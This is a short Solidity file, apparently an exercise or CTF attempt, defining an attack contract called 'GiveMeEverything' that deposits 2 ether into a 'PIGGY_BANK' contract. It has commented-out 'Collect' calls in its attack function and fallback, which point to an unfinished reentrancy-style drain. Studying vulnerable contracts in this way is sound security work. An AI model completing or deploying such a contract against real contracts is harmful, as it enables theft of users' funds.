pragma solidity ^0.4.19;

import "4.sol";

contract GiveMeEverything {
    PIGGY_BANK public bank;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        bank = PIGGY_BANK(_addr);
        bank.Put.value(2 ether)(address(this));
        //bank.Collect(1 ether);
    }
    
    function() public payable {
        //bank.Collect(1 ether);
    }
    
}